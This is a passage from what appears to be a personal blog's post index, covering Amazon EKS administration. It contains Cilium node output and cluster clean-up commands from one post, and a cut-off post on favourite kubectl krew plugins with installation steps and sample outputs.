eks.amazonaws.com/sourceLaunchTemplateId=lt-077e09aaa2d4af922 eks.amazonaws.com/sourceLaunchTemplateVersion=1 failure-domain.beta.kubernetes.io/region=us-east-1 failure-domain.beta.kubernetes.io/zone=us-east-1a k8s.io/cloud-provider-aws=4484beb1485b6869a3e7e4b77bb31f1f kubernetes.io/arch=arm64 kubernetes.io/hostname=ip-192-168-19-152.ec2.internal kubernetes.io/os=linux node.kubernetes.io/instance-type=t4g.medium topology.ebs.csi.aws.com/zone=us-east-1a topology.kubernetes.io/region=us-east-1 topology.kubernetes.io/zone=us-east-1a vpc.amazonaws.com/has-trunk-attached=false Annotations: network.cilium.io/wg-pub-key: lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx= API Version: cilium.io/v2 Kind: CiliumNode Metadata: Creation Timestamp: 2023-08-18T17:03:10Z Generation: 6 Owner References: API Version: v1 Kind: Node Name: ip-192-168-19-152.ec2.internal UID: b956ae10-e866-4167-9ff1-7d6c889fed44 Resource Version: 7677 UID: 36fbc130-b9e7-46a8-a62b-b723c6dbb5a3 Spec: Addresses: Ip: 192.168.19.152 Type: InternalIP Ip: 54.147.78.10 Type: ExternalIP Ip: 192.168.13.220 Type: CiliumInternalIP Alibaba - Cloud: Azure: Encryption: Eni: Availability - Zone: us-east-1a Disable - Prefix - Delegation: false First - Interface - Index: 0 Instance - Type: t4g.medium Node - Subnet - Id: subnet-0ac4e4f9d12641825 Use - Primary - Address: false Vpc - Id: vpc-0aaac805cdcd49be5 Health: ipv4: 192.168.0.71 Ingress: Instance - Id: i-042bf8f0cee76e7f0 Ipam: Pod CID Rs: 10.152.0.0/16 Pool: 192.168.0.64: Resource: eni-01d99349e4f322bf6 192.168.0.65: Resource: eni-01d99349e4f322bf6 192.168.0.66: Resource: eni-01d99349e4f322bf6 192.168.0.67: Resource: eni-01d99349e4f322bf6 192.168.0.68: Resource: eni-01d99349e4f322bf6 192.168.0.69: Resource: eni-01d99349e4f322bf6 192.168.0.70: Resource: eni-01d99349e4f322bf6 192.168.0.71: Resource: eni-01d99349e4f322bf6 192.168.0.72: Resource: eni-01d99349e4f322bf6 192.168.0.73: Resource: eni-01d99349e4f322bf6 192.168.0.74: Resource: eni-01d99349e4f322bf6 192.168.0.75: Resource: eni-01d99349e4f322bf6 192.168.0.76: Resource: eni-01d99349e4f322bf6 192.168.0.77: Resource: eni-01d99349e4f322bf6 192.168.0.78: Resource: eni-01d99349e4f322bf6 192.168.0.79: Resource: eni-01d99349e4f322bf6 192.168.13.208: Resource: eni-01d99349e4f322bf6 192.168.13.209: Resource: eni-01d99349e4f322bf6 192.168.13.210: Resource: eni-01d99349e4f322bf6 192.168.13.211: Resource: eni-01d99349e4f322bf6 192.168.13.212: Resource: eni-01d99349e4f322bf6 192.168.13.213: Resource: eni-01d99349e4f322bf6 192.168.13.214: Resource: eni-01d99349e4f322bf6 192.168.13.215: Resource: eni-01d99349e4f322bf6 192.168.13.216: Resource: eni-01d99349e4f322bf6 192.168.13.217: Resource: eni-01d99349e4f322bf6 192.168.13.218: Resource: eni-01d99349e4f322bf6 192.168.13.219: Resource: eni-01d99349e4f322bf6 192.168.13.220: Resource: eni-01d99349e4f322bf6 192.168.13.221: Resource: eni-01d99349e4f322bf6 192.168.13.222: Resource: eni-01d99349e4f322bf6 192.168.13.223: Resource: eni-01d99349e4f322bf6 Pools: Pre - Allocate: 8 Status: Alibaba - Cloud: Azure: Eni: Enis: eni-01d99349e4f322bf6: Addresses: 192.168.13.208 192.168.13.209 192.168.13.210 192.168.13.211 192.168.13.212 192.168.13.213 192.168.13.214 192.168.13.215 192.168.13.216 192.168.13.217 192.168.13.218 192.168.13.219 192.168.13.220 192.168.13.221 192.168.13.222 192.168.13.223 192.168.0.64 192.168.0.65 192.168.0.66 192.168.0.67 192.168.0.68 192.168.0.69 192.168.0.70 192.168.0.71 192.168.0.72 192.168.0.73 192.168.0.74 192.168.0.75 192.168.0.76 192.168.0.77 192.168.0.78 192.168.0.79 Id: eni-01d99349e4f322bf6 Ip: 192.168.19.152 Mac: 12:6d:a9:a9:74:f1 Prefixes: 192.168.13.208/28 192.168.0.64/28 Security - Groups: sg-0e72cf267ee2c8aa2 Subnet: Cidr: 192.168.0.0/19 Id: subnet-0ac4e4f9d12641825 Tags: cluster.k8s.amazonaws.com/name: k01 node.k8s.amazonaws.com/instance_id: i-042bf8f0cee76e7f0 Vpc: Id: vpc-0aaac805cdcd49be5 Primary - Cidr: 192.168.0.0/16 Ipam: Operator - Status: Used: 192.168.0.69: Owner: oauth2-proxy/oauth2-proxy-7d5fd7948f-qvnhr Resource: eni-01d99349e4f322bf6 192.168.0.71: Owner: health Resource: eni-01d99349e4f322bf6 192.168.0.73: Owner: kube-prometheus-stack/kube-prometheus-stack-grafana-54dbcd857d-2hh4x [restored] Resource: eni-01d99349e4f322bf6 192.168.0.75: Owner: cilium/hubble-relay-d44b99d7b-tllkk Resource: eni-01d99349e4f322bf6 192.168.0.76: Owner: cilium/hubble-ui-869b75b895-cjs2w Resource: eni-01d99349e4f322bf6 192.168.0.77: Owner: external-dns/external-dns-7fdb8769ff-srj48 Resource: eni-01d99349e4f322bf6 192.168.13.211: Owner: kube-prometheus-stack/kube-prometheus-stack-kube-state-metrics-78c9594f8f-22lgc [restored] Resource: eni-01d99349e4f322bf6 192.168.13.213: Owner: aws-ebs-csi-driver/ebs-csi-node-svjd8 [restored] Resource: eni-01d99349e4f322bf6 192.168.13.215: Owner: kube-system/coredns-7975d6fb9b-jzqv7 [restored] Resource: eni-01d99349e4f322bf6 192.168.13.217: Owner: kube-system/coredns-7975d6fb9b-c5rfb [restored] Resource: eni-01d99349e4f322bf6 192.168.13.220: Owner: router Resource: eni-01d99349e4f322bf6 192.168.13.222: Owner: aws-ebs-csi-driver/ebs-csi-controller-7847774b66-b4lsl [restored] Resource: eni-01d99349e4f322bf6 192.168.13.223: Owner: forecastle/forecastle-58d7ccb8f8-vw5ct Resource: eni-01d99349e4f322bf6 Events: &lt;none&gt; Name: ip-192-168-3-237.ec2.internal Namespace: Labels: alpha.eksctl.io/cluster-name=k01 alpha.eksctl.io/nodegroup-name=mng01-ng beta.kubernetes.io/arch=arm64 beta.kubernetes.io/instance-type=t4g.medium beta.kubernetes.io/os=linux eks.amazonaws.com/capacityType=ON_DEMAND eks.amazonaws.com/nodegroup=mng01-ng eks.amazonaws.com/nodegroup-image=ami-05d67a5609bec1651 eks.amazonaws.com/sourceLaunchTemplateId=lt-077e09aaa2d4af922 eks.amazonaws.com/sourceLaunchTemplateVersion=1 failure-domain.beta.kubernetes.io/region=us-east-1 failure-domain.beta.kubernetes.io/zone=us-east-1a k8s.io/cloud-provider-aws=4484beb1485b6869a3e7e4b77bb31f1f kubernetes.io/arch=arm64 kubernetes.io/hostname=ip-192-168-3-237.ec2.internal kubernetes.io/os=linux node.kubernetes.io/instance-type=t4g.medium topology.ebs.csi.aws.com/zone=us-east-1a topology.kubernetes.io/region=us-east-1 topology.kubernetes.io/zone=us-east-1a vpc.amazonaws.com/has-trunk-attached=false Annotations: network.cilium.io/wg-pub-key: AxE7xXNN/Izr5ajkE48eSWtOH2WeQBTwhjS3Rma1tDo= API Version: cilium.io/v2 Kind: CiliumNode Metadata: Creation Timestamp: 2023-08-18T17:03:11Z Generation: 6 Owner References: API Version: v1 Kind: Node Name: ip-192-168-3-237.ec2.internal UID: d088d0dd-e531-4652-9a2b-fe6f80516f00 Resource Version: 6220 UID: 2e961861-ea2b-412b-820f-962a9db28b60 Spec: Addresses: Ip: 192.168.3.237 Type: InternalIP Ip: 18.208.178.29 Type: ExternalIP Ip: 192.168.8.67 Type: CiliumInternalIP Alibaba - Cloud: Azure: Encryption: Eni: Availability - Zone: us-east-1a Disable - Prefix - Delegation: false First - Interface - Index: 0 Instance - Type: t4g.medium Node - Subnet - Id: subnet-0ac4e4f9d12641825 Use - Primary - Address: false Vpc - Id: vpc-0aaac805cdcd49be5 Health: ipv4: 192.168.8.66 Ingress: Instance - Id: i-086acad17bd2d676b Ipam: Pod CID Rs: 10.237.0.0/16 Pool: 192.168.30.32: Resource: eni-0f47ee6b88bd0143b 192.168.30.33: Resource: eni-0f47ee6b88bd0143b 192.168.30.34: Resource: eni-0f47ee6b88bd0143b 192.168.30.35: Resource: eni-0f47ee6b88bd0143b 192.168.30.36: Resource: eni-0f47ee6b88bd0143b 192.168.30.37: Resource: eni-0f47ee6b88bd0143b 192.168.30.38: Resource: eni-0f47ee6b88bd0143b 192.168.30.39: Resource: eni-0f47ee6b88bd0143b 192.168.30.40: Resource: eni-0f47ee6b88bd0143b 192.168.30.41: Resource: eni-0f47ee6b88bd0143b 192.168.30.42: Resource: eni-0f47ee6b88bd0143b 192.168.30.43: Resource: eni-0f47ee6b88bd0143b 192.168.30.44: Resource: eni-0f47ee6b88bd0143b 192.168.30.45: Resource: eni-0f47ee6b88bd0143b 192.168.30.46: Resource: eni-0f47ee6b88bd0143b 192.168.30.47: Resource: eni-0f47ee6b88bd0143b 192.168.8.64: Resource: eni-0f47ee6b88bd0143b 192.168.8.65: Resource: eni-0f47ee6b88bd0143b 192.168.8.66: Resource: eni-0f47ee6b88bd0143b 192.168.8.67: Resource: eni-0f47ee6b88bd0143b 192.168.8.68: Resource: eni-0f47ee6b88bd0143b 192.168.8.69: Resource: eni-0f47ee6b88bd0143b 192.168.8.70: Resource: eni-0f47ee6b88bd0143b 192.168.8.71: Resource: eni-0f47ee6b88bd0143b 192.168.8.72: Resource: eni-0f47ee6b88bd0143b 192.168.8.73: Resource: eni-0f47ee6b88bd0143b 192.168.8.74: Resource: eni-0f47ee6b88bd0143b 192.168.8.75: Resource: eni-0f47ee6b88bd0143b 192.168.8.76: Resource: eni-0f47ee6b88bd0143b 192.168.8.77: Resource: eni-0f47ee6b88bd0143b 192.168.8.78: Resource: eni-0f47ee6b88bd0143b 192.168.8.79: Resource: eni-0f47ee6b88bd0143b Pools: Pre - Allocate: 8 Status: Alibaba - Cloud: Azure: Eni: Enis: eni-0f47ee6b88bd0143b: Addresses: 192.168.8.64 192.168.8.65 192.168.8.66 192.168.8.67 192.168.8.68 192.168.8.69 192.168.8.70 192.168.8.71 192.168.8.72 192.168.8.73 192.168.8.74 192.168.8.75 192.168.8.76 192.168.8.77 192.168.8.78 192.168.8.79 192.168.30.32 192.168.30.33 192.168.30.34 192.168.30.35 192.168.30.36 192.168.30.37 192.168.30.38 192.168.30.39 192.168.30.40 192.168.30.41 192.168.30.42 192.168.30.43 192.168.30.44 192.168.30.45 192.168.30.46 192.168.30.47 Id: eni-0f47ee6b88bd0143b Ip: 192.168.3.237 Mac: 12:e1:d7:9d:e6:59 Prefixes: 192.168.8.64/28 192.168.30.32/28 Security - Groups: sg-0e72cf267ee2c8aa2 Subnet: Cidr: 192.168.0.0/19 Id: subnet-0ac4e4f9d12641825 Tags: cluster.k8s.amazonaws.com/name: k01 node.k8s.amazonaws.com/instance_id: i-086acad17bd2d676b Vpc: Id: vpc-0aaac805cdcd49be5 Primary - Cidr: 192.168.0.0/16 Ipam: Operator - Status: Used: 192.168.8.64: Owner: aws-ebs-csi-driver/ebs-csi-controller-7847774b66-nrlf4 [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.66: Owner: health Resource: eni-0f47ee6b88bd0143b 192.168.8.67: Owner: router Resource: eni-0f47ee6b88bd0143b 192.168.8.68: Owner: snapshot-controller/snapshot-controller-8658dd5c86-z2z6q [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.69: Owner: cert-manager/cert-manager-859997c796-j9hh8 Resource: eni-0f47ee6b88bd0143b 192.168.8.70: Owner: cert-manager/cert-manager-cainjector-7bb8cb69c5-2q6fk Resource: eni-0f47ee6b88bd0143b 192.168.8.72: Owner: mailhog/mailhog-6f54fccf85-pdb9k [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.73: Owner: aws-ebs-csi-driver/ebs-csi-node-n8vrn [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.78: Owner: kube-prometheus-stack/alertmanager-kube-prometheus-stack-alertmanager-0 [restored] Resource: eni-0f47ee6b88bd0143b Events: &lt;none&gt; This command helps find exposed ports (HostNetwork) to check for port collisions: kubectl get endpoints -A -o json | jq '.items[] | (.metadata.name , .subsets[].addresses[].ip, .subsets[].addresses[].nodeName, .subsets[].addresses[].targetRef.name, .subsets[].ports[])' kubectl get pods -A -o json | jq \".items[] | select (.spec.hostNetwork==true) .spec.containers[].name, .metadata.name, .spec.containers[].ports[0]\" Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove Volumes and Snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-ebs-csi-driver,aws-for-fluent-bit,cert-manager,cilium,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailhog,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "My favourite krew plugins for kubectl", "url": "/posts/my-favourite-krew-plugins-kubectl/", "categories": "Kubernetes", "tags": "kubernetes, kubectl", "date": "2023-06-06 00:00:00 +0200", "content": "I would like to share a few notes about the kubectl plugins I use, installed via krew. This is not intended to be a comprehensive description of these plugins; instead, I prefer to focus on examples and screenshots. Links: Suman Chakraborty’s Post Top 15 Kubectl plugins for security engineers Making Kubernetes Operations Easy with kubectl Plugins Requirements An Amazon EKS cluster (as described in “Cheapest Amazon EKS)” kubectl Install krew Install Krew, the plugin manager for the kubectl command-line tool: TMP_DIR=\"${TMP_DIR:-${PWD}}\" ARCH=\"amd64\" curl -sL \"https://github.com/kubernetes-sigs/krew/releases/download/v0.4.5/krew-linux_${ARCH}.tar.gz\" | tar -xvzf - -C \"${TMP_DIR}\" --no-same-owner --strip-components=1 --wildcards \"*/krew-linux*\" \"${TMP_DIR}/krew-linux_${ARCH}\" install krew rm \"${TMP_DIR}/krew-linux_${ARCH}\" export PATH=\"${HOME}/.krew/bin:${PATH}\" My Favorite krew + kubectl plugins Here is a list of my favorite Krew and kubectl plugins: cert-manager This kubectl add-on automates the management and issuance of TLS certificates. It allows for direct interaction with cert-manager resources, such as performing manual renewal of Certificate resources. Installation of the cert-manager Krew plugin: kubectl krew install cert-manager Get details about the current status of a cert-manager Certificate resource, including information on related resources like CertificateRequest or Order: kubectl cert-manager status certificate --namespace cert-manager ingress-cert-staging Name: ingress-cert-staging Namespace: cert-manager Created at: 2023-06-18T07:31:46Z Conditions: Ready: True, Reason: Ready, Message: Certificate is up to date and has not expired DNS Names: - *.k01.k8s.mylabs.dev - k01.k8s.mylabs.dev Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Issuing 41m cert-manager-certificates-trigger Issuing certificate as Secret does not exist Normal Generated 41m cert-manager-certificates-key-manager Stored new private key in temporary Secret resource \"ingress-cert-staging-jbw7s\" Normal Requested 41m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-staging-r2mnb\" Normal Reused 37m cert-manager-certificates-key-manager Reusing private key stored in existing Secret resource \"ingress-cert-staging\" Normal Requested 37m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-staging-jm8c2\" Normal Issuing 37m (x2 over 38m) cert-manager-certificates-issuing The certificate has been successfully issued Issuer: Name: letsencrypt-staging-dns Kind: ClusterIssuer Conditions: Ready: True, Reason: ACMEAccountRegistered, Message: The ACME account was registered with the ACME server Events: &lt;none&gt; Secret: Name: ingress-cert-staging Issuer Country: US Issuer Organisation: (STAGING) Let's Encrypt Issuer Common Name: (STAGING) Artificial Apricot R3 Key Usage: Digital Signature, Key Encipherment Extended Key Usages: Server Authentication, Client Authentication Public Key Algorithm: RSA Signature Algorithm: SHA256-RSA Subject Key ID: 6ad5d66e8d4e46409107d6af11283ef603f5113b Authority Key ID: de727a48df31c3a650df9f8523df57374b5d2e65 Serial Number: fabb47cea28a80ce5add9eb5e02c5e7c8273 Events: &lt;none&gt; Not Before: 2023-06-18T06:36:23Z Not After: 2023-09-16T06:36:22Z Renewal Time: 2023-08-17T06:36:22Z No CertificateRequest found for this Certificate Mark cert-manager Certificate resources for manual renewal: kubectl cert-manager renew --namespace cert-manager ingress-cert-staging sleep 5 kubectl cert-manager inspect secret --namespace cert-manager ingress-cert-staging | grep -A2 -E 'Validity period' Manually triggered issuance of Certificate cert-manager/ingress-cert-staging Validity period: Not Before: Sun, 18 Jun 2023 07:15:58 UTC Not After: Sat, 16 Sep 2023 07:15:57 UTC The Certificate was created at 2023-06-18 06:36:23 and then rotated on 18 Jun 2023 07:15:58. get-all Similar to kubectl get all, but it retrieves truly all resources. Installation of the get-all Krew plugin: kubectl krew install get-all Get all resources from the default namespace: kubectl get-all -n default NAME NAMESPACE AGE configmap/kube-root-ca.crt default 68m endpoints/kubernetes default 69m serviceaccount/default default 68m service/kubernetes default 69m endpointslice.discovery.k8s.io/kubernetes default 69m ice ice is an open-source tool that helps Kubernetes users monitor and optimize container resource usage. Installation of the ice Krew plugin: kubectl krew install ice List CPU information for containers within pods: kubectl ice cpu -n kube-prometheus-stack --sort used PODNAME CONTAINER USED REQUEST LIMIT %REQ %LIMIT prometheus-kube-prometheus-stack-prometheus-0 config-reloader 0m 200m 200m - - alertmanager-kube-prometheus-stack-alertmanager-0 alertmanager 1m 0m 0m - - alertmanager-kube-prometheus-stack-alertmanager-0 config-reloader 1m 200m 200m 0.01 0.01 kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-dashboard 1m - - - - kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-datasources 1m - - - - kube-prometheus-stack-operator-7f45586f68-9rz6j kube-prometheus-stack 1m - - - - kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb kube-state-metrics 2m - - - - kube-prometheus-stack-prometheus-node-exporter-m4k5m node-exporter 2m - - - - kube-prometheus-stack-prometheus-node-exporter-x5bhm node-exporter 2m - - - - kube-prometheus-stack-grafana-896f8645-6q9lb grafana 8m - - - - prometheus-kube-prometheus-stack-prometheus-0 prometheus 52m - - - - List memory information for containers within pods: kubectl ice memory -n kube-prometheus-stack --node-tree NAMESPACE NAME USED REQUEST LIMIT %REQ %LIMIT kube-prometheus-stack StatefulSet/alertmanager-kube-prometheus-stack-alertmanager 19.62Mi 250.00Mi 50.00Mi 0.04 0.01 kube-prometheus-stack └─Pod/alertmanager-kube-prometheus-stack-alertmanager-0 19.62Mi 250.00Mi 50.00Mi 0.04 0.01 kube-prometheus-stack └─Container/alertmanager 16.44Mi 200Mi 0 8.22 - kube-prometheus-stack └─Container/config-reloader 3.18Mi 50Mi 50Mi 6.35 6.35 - Node/ip-192-168-26-84.ec2.internal 241.14Mi 0 0 - - kube-prometheus-stack └─Deployment/kube-prometheus-stack-grafana 231.98Mi 0 0 - - kube-prometheus-stack └─ReplicaSet/kube-prometheus-stack-grafana-896f8645 231.98Mi 0 0 - - kube-prometheus-stack └─Pod/kube-prometheus-stack-grafana-896f8645-6q9lb 231.98Mi 0 0 - - kube-prometheus-stack └─Container/grafana-sc-dashboard 70.99Mi - - - - kube-prometheus-stack └─Container/grafana-sc-datasources 72.67Mi - - - - kube-prometheus-stack └─Container/grafana 88.32Mi - - - - kube-prometheus-stack └─DaemonSet/kube-prometheus-stack-prometheus-node-exporter 9.16Mi 0 0 - - kube-prometheus-stack └─Pod/kube-prometheus-stack-prometheus-node-exporter-m4k5m 9.16Mi 0 0 - - kube-prometheus-stack └─Container/node-exporter 9.16Mi - - - - - Node/ip-192-168-7-23.ec2.internal 44.42Mi 0 0 - - kube-prometheus-stack └─Deployment/kube-prometheus-stack-kube-state-metrics 12.68Mi 0 0 - - kube-prometheus-stack └─ReplicaSet/kube-prometheus-stack-kube-state-metrics-669bd5c594 12.68Mi 0 0 - - kube-prometheus-stack └─Pod/kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb 12.68Mi 0 0 - - kube-prometheus-stack └─Container/kube-state-metrics 12.68Mi - - - - kube-prometheus-stack └─Deployment/kube-prometheus-stack-operator 22.64Mi 0 0 - - kube-prometheus-stack └─ReplicaSet/kube-prometheus-stack-operator-7f45586f68 22.64Mi 0 0 - - kube-prometheus-stack └─Pod/kube-prometheus-stack-operator-7f45586f68-9rz6j 22.64Mi 0 0 - - kube-prometheus-stack └─Container/kube-prometheus-stack 22.64Mi - - - - kube-prometheus-stack └─DaemonSet/kube-prometheus-stack-prometheus-node-exporter 9.10Mi 0 0 - - kube-prometheus-stack └─Pod/kube-prometheus-stack-prometheus-node-exporter-x5bhm 9.10Mi 0 0 - - kube-prometheus-stack └─Container/node-exporter 9.11Mi - - - - kube-prometheus-stack StatefulSet/prometheus-kube-prometheus-stack-prometheus 400.28Mi 50.00Mi 50.00Mi 0.80 0.80 kube-prometheus-stack └─Pod/prometheus-kube-prometheus-stack-prometheus-0 400.28Mi 50.00Mi 50.00Mi 0.80 0.80 kube-prometheus-stack └─Container/prometheus 393.89Mi - - - - kube-prometheus-stack └─Container/config-reloader 6.38Mi 50Mi 50Mi 12.77 12.77 List image information for containers within pods: kubectl ice image -n cert-manager PODNAME CONTAINER PULL IMAGE TAG cert-manager-777fbdc9f8-ng8dg cert-manager-controller IfNotPresent quay.io/jetstack/cert-manager-controller v1.12.2 cert-manager-cainjector-65857fccf8-krpr9 cert-manager-cainjector IfNotPresent quay.io/jetstack/cert-manager-cainjector v1.12.2 cert-manager-webhook-54f9d96756-plv84 cert-manager-webhook IfNotPresent quay.io/jetstack/cert-manager-webhook v1.12.2 List the status of individual containers within pods: kubectl ice status -n kube-prometheus-stack PODNAME CONTAINER READY STARTED RESTARTS STATE REASON EXIT-CODE SIGNAL AGE alertmanager-kube-prometheus-stack-alertmanager-0 init-config-reloader true - 0 Terminated Completed 0 0 100m alertmanager-kube-prometheus-stack-alertmanager-0 alertmanager true true 0 Running - - - 100m alertmanager-kube-prometheus-stack-alertmanager-0 config-reloader true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb download-dashboards true - 0 Terminated Completed 0 0 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-dashboard true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-datasources true true 0 Running - - - 100m kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb kube-state-metrics true true 0 Running - - - 100m kube-prometheus-stack-operator-7f45586f68-9rz6j kube-prometheus-stack true true 0 Running - - - 100m kube-prometheus-stack-prometheus-node-exporter-m4k5m node-exporter true true 0 Running - - - 100m kube-prometheus-stack-prometheus-node-exporter-x5bhm node-exporter true true 0 Running - - - 100m prometheus-kube-prometheus-stack-prometheus-0 init-config-reloader true - 0 Terminated Completed 0 0 100m prometheus-kube-prometheus-stack-prometheus-0 config-reloader true true 0 Running - - - 100m prometheus-kube-prometheus-stack-prometheus-0 prometheus true true 0 Running - - - 100m ktop A top-like tool for your Kubernetes clusters. Installation of the ktop Krew plugin: kubectl krew install ktop Run ktop: kubectl ktop ktop screenshot kubepug A Kubernetes Pre-Upgrade Checker. KubePug logo Installation of the deprecations Krew plugin: kubectl krew install deprecations Shows all deprecated objects in a Kubernetes cluster, allowing an operator to verify them before upgrading the cluster: kubectl deprecations --k8s-version=v1.27.0 deprecations screenshot deprecations screenshot from official GitHub repository node-ssm This kubectl plugin allows direct connections to AWS EKS cluster nodes managed by Systems Manager, relying on the local AWS CLI and the session-manager-plugin being installed. Installation of the node-ssm Krew plugin: kubectl krew install node-ssm Access a node using SSM: K8S_NODE=$(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers | head -n 1) kubectl node-ssm --target \"${K8S_NODE}\" Starting session with SessionId: ruzickap@M-C02DP163ML87-k8s-1687787750-03553ad56b6a28df6 Welcome to Bottlerocket's control container! ╱╲ ╱┄┄╲ This container gives you access to the Bottlerocket API, ... ... ... [ssm-user@control]$ ns A faster way to switch between namespaces in kubectl. Installation of the ns Krew plugin: kubectl krew install ns Change the active namespace of the current context and list secrets from cert-manager without using the --namespace or -n option: kubectl ns cert-manager kubectl get secrets Context \"arn:aws:eks:us-east-1:729560437327:cluster/k01\" modified. Active namespace is \"cert-manager\". NAME TYPE DATA AGE cert-manager-webhook-ca Opaque 3 107m ingress-cert-staging kubernetes.io/tls 2 102m letsencrypt-staging-dns Opaque 1 106m sh.helm.release.v1.cert-manager.v1 helm.sh/release.v1 1 107m open-svc The kubectl open-svc plugin makes services accessible via their ClusterIP from outside your cluster. Installation of the open-svc Krew plugin: kubectl krew install open-svc Open the Grafana Dashboard URL in the browser: kubectl open-svc kube-prometheus-stack-grafana -n kube-prometheus-stack open-svc screenshot from official GitHub repository pod-lens A kubectl plugin to show pod-related resources. pod-lens logo Installation of the pod-lens Krew plugin: kubectl krew install pod-lens Find related workloads, namespace, node, service, configmap, secret, ingress, PVC, HPA, and PDB by pod name and display them in a tree structure: kubectl pod-lens -n kube-prometheus-stack prometheus-kube-prometheus-stack-prometheus-0 pod-lens showing details in kube-prometheus-stack namespace kubectl pod-lens -n karpenter karpenter- pod-lens showing details in karpenter namespace rbac-tool Installation of the rbac-tool Krew plugin: kubectl krew install rbac-tool Shows which subjects have RBAC get permissions for /apis: kubectl rbac-tool who-can get /apis TYPE | SUBJECT | NAMESPACE +-------+----------------------+-----------+ Group | system:authenticated | Group | system:masters | User | eks:addon-manager | Shows which subjects have RBAC watch permissions for deployments.apps: kubectl rbac-tool who-can watch deployments.apps TYPE | SUBJECT | NAMESPACE +----------------+------------------------------------------+-----------------------+ Group | eks:service-operations | Group | system:masters | ServiceAccount | deployment-controller | kube-system ServiceAccount | disruption-controller | kube-system ServiceAccount | eks-vpc-resource-controller | kube-system ServiceAccount | generic-garbage-collector | kube-system ServiceAccount | karpenter | karpenter ServiceAccount | kube-prometheus-stack-kube-state-metrics | kube-prometheus-stack ServiceAccount | resourcequota-controller | kube-system User | eks:addon-manager | User | eks:vpc-resource-controller | User | system:kube-controller-manager | Get details about the current “user”: kubectl rbac-tool whoami {Username: \"kubernetes-admin\", UID: \"aws-iam-authenticator:7xxxxxxxxxx7:AxxxxxxxxxxxxxxxxxxxL\", Groups: [\"system:masters\", \"system:authenticated\"], Extra: {accessKeyId: [\"AxxxxxxxxxxxxxxxxxxA\"], arn: [\"arn:aws:sts::7xxxxxxxxxx7:assumed-role/GitHubRole/ruzickap@mymac-k8s-1111111111\"], canonicalArn: [\"arn:aws:iam::7xxxxxxxxxx7:role/GitHubRole\"], principalId: [\"AxxxxxxxxxxxxxxxxxxxL\"], sessionName: [\"ruzickap@mymac-k8s-1111111111\"]}} List the Kubernetes RBAC Roles/ClusterRoles used by a given User, ServiceAccount, or Group: kubectl rbac-tool lookup kube-prometheus SUBJECT | SUBJECT TYPE | SCOPE | NAMESPACE | ROLE +------------------------------------------+----------------+-------------+-----------------------+-------------------------------------------+ kube-prometheus-stack-grafana | ServiceAccount | ClusterRole | | kube-prometheus-stack-grafana-clusterrole kube-prometheus-stack-grafana | 